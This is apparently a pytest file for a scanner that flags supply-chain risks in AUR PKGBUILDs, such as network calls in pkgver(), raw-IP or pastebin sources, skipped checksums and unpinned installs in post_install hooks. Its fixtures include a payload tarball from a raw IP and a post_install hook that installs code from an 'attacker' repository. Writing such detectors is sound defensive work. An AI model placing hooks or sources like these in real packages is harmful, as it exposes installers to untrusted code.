from __future__ import annotations

from aurmanager.rules.integrity import (
    INT001PkgverNetworkCall,
    INT002SuspiciousSourceHost,
    INT003SkippedChecksumOnNetworkSource,
    INT005InstallHookPullsUnpinnedDeps,
)


def test_int001_fires_on_git_ls_remote(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgver() {
          git ls-remote --tags origin | tail -1 | cut -d/ -f3
        }
        """
    )
    assert len(list(INT001PkgverNetworkCall().check(ctx))) == 1


def test_int001_fires_on_curl(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgver() {
          curl -s https://example.com/version.txt
        }
        """
    )
    assert len(list(INT001PkgverNetworkCall().check(ctx))) == 1


def test_int001_does_not_fire_on_local_git_describe(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgver() {
          cd "$srcdir/foo"
          git describe --long --tags | sed 's/-/./g'
        }
        """
    )
    assert list(INT001PkgverNetworkCall().check(ctx)) == []


def test_int002_fires_on_pastebin_host(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://pastebin.com/raw/AbCdEfGh")
        sha256sums=('abc')
        """
    )
    assert len(list(INT002SuspiciousSourceHost().check(ctx))) == 1


def test_int002_fires_on_raw_ip_literal(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("http://185.220.101.5/payload.tar.gz")
        sha256sums=('abc')
        """
    )
    assert len(list(INT002SuspiciousSourceHost().check(ctx))) == 1


def test_int002_does_not_fire_on_github_release(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://github.com/foo/foo/releases/download/v1.0/foo-1.0.tar.gz")
        sha256sums=('abc')
        """
    )
    assert list(INT002SuspiciousSourceHost().check(ctx)) == []


def test_int002_fires_on_compound_vcs_scheme_with_raw_ip(make_pkgbuild_ctx):
    # git+https://, hg+ssh://, etc. are compound schemes (VCS + transport) -- the
    # scheme pattern must accept the '+' or these sources are silently skipped.
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("foo::git+http://185.220.101.5/repo.git")
        sha256sums=('SKIP')
        """
    )
    assert len(list(INT002SuspiciousSourceHost().check(ctx))) == 1


def test_int003_fires_on_skip_for_plain_network_tarball(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://example.com/foo.tar.gz")
        sha256sums=('SKIP')
        """
    )
    assert len(list(INT003SkippedChecksumOnNetworkSource().check(ctx))) == 1


def test_int003_does_not_fire_on_skip_for_vcs_source(make_pkgbuild_ctx):
    # SKIP is idiomatic for git+/svn+/hg+/bzr+ sources -- there's no fixed content
    # to checksum, the VCS itself provides integrity.
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("foo::git+https://example.com/foo.git")
        sha256sums=('SKIP')
        """
    )
    assert list(INT003SkippedChecksumOnNetworkSource().check(ctx)) == []


def test_int003_does_not_fire_on_skip_for_local_file(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://example.com/foo.tar.gz" "local.patch")
        sha256sums=('abc' 'SKIP')
        """
    )
    assert list(INT003SkippedChecksumOnNetworkSource().check(ctx)) == []


def test_int003_does_not_fire_when_a_second_checksum_array_protects_source(make_pkgbuild_ctx):
    # Regression: only the first-declared checksum array was inspected, so
    # b2sums=('SKIP') falsely flagged sources that sha256sums (declared second)
    # actually protects.
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
        b2sums=('SKIP' 'SKIP')
        sha256sums=('deadbeef' 'deadbeef')
        """
    )
    assert list(INT003SkippedChecksumOnNetworkSource().check(ctx)) == []


def test_int003_checks_every_source_even_when_first_array_is_shorter(make_pkgbuild_ctx):
    # Regression: iteration used to break as soon as the *first-declared* checksum
    # array ran out of entries, silently skipping every later source instead of
    # checking it against the other declared arrays.
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
        b2sums=('SKIP')
        sha256sums=('deadbeef' 'SKIP')
        """
    )
    findings = list(INT003SkippedChecksumOnNetworkSource().check(ctx))
    assert len(findings) == 1
    assert "b.tar.gz" in findings[0].message


def test_int003_fires_when_no_checksum_array_covers_a_source(make_pkgbuild_ctx):
    # Regression: a network source with no checksum entry at all (every declared
    # array is too short to reach its index) used to be silently skipped -- it's
    # just as unprotected as an explicit SKIP, so it must fire too.
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
        sha256sums=('deadbeef')
        """
    )
    findings = list(INT003SkippedChecksumOnNetworkSource().check(ctx))
    assert len(findings) == 1
    assert "b.tar.gz" in findings[0].message


def test_int003_fires_on_skip_for_sha1sums(make_pkgbuild_ctx):
    # Regression: CHECKSUM_KEYS only recognized sha256sums/sha512sums/b2sums/
    # md5sums, so a PKGBUILD using only sha1sums (also fully supported by
    # makepkg) had an empty ctx.checksums and INT003 never ran at all.
    ctx = make_pkgbuild_ctx(
        """
        pkgname=foo
        source=("https://example.com/foo.tar.gz")
        sha1sums=('SKIP')
        """
    )
    assert len(list(INT003SkippedChecksumOnNetworkSource().check(ctx))) == 1


def test_int005_fires_on_npm_install_in_post_install(make_install_ctx):
    ctx = make_install_ctx(
        """
        post_install() {
          npm install atomic-lockfile
        }
        """
    )
    findings = list(INT005InstallHookPullsUnpinnedDeps().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "HIGH"


def test_int005_fires_on_cargo_install_in_post_install(make_install_ctx):
    # Regression: _PACKAGE_MANAGERS was a fixed set missing cargo/gem/composer/
    # luarocks, so install hooks using those to fetch unaudited code bypassed
    # the rule entirely even though it's the same technique.
    ctx = make_install_ctx(
        """
        post_install() {
          cargo install --git https://github.com/attacker/x evil
        }
        """
    )
    findings = list(INT005InstallHookPullsUnpinnedDeps().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "HIGH"


def test_int005_does_not_fire_on_unrelated_post_install(make_install_ctx):
    ctx = make_install_ctx(
        """
        post_install() {
          echo "Thanks for installing!"
        }
        """
    )
    assert list(INT005InstallHookPullsUnpinnedDeps().check(ctx)) == []


def test_int005_does_not_fire_in_build_lifecycle_functions(make_pkgbuild_ctx):
    # npm install as an ordinary build step (fetching the package's own declared
    # deps) is normal and not what this rule targets -- only unpinned installs
    # smuggled into post_install/post_upgrade hooks.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          npm install
        }
        """
    )
    assert list(INT005InstallHookPullsUnpinnedDeps().check(ctx)) == []


def test_int005_message_reflects_pinned_version(make_install_ctx):
    ctx = make_install_ctx(
        """
        post_install() {
          npm install atomic-lockfile@1.2.3
        }
        """
    )
    findings = list(INT005InstallHookPullsUnpinnedDeps().check(ctx))
    assert len(findings) == 1
    assert "unpinned" not in findings[0].message
    assert "pins a specific version" in findings[0].message


def test_int005_flag_value_not_mistaken_for_unpinned_package(make_install_ctx):
    # --index-url's URL argument must not be treated as a package spec -- otherwise
    # a genuinely pinned install (requests==2.31.0) gets misreported as "unpinned"
    # because the URL doesn't match the version-pin pattern.
    ctx = make_install_ctx(
        """
        post_install() {
          pip install --index-url https://pypi.org/simple requests==2.31.0
        }
        """
    )
    findings = list(INT005InstallHookPullsUnpinnedDeps().check(ctx))
    assert len(findings) == 1
    assert "unpinned" not in findings[0].message
    assert "pins a specific version" in findings[0].message
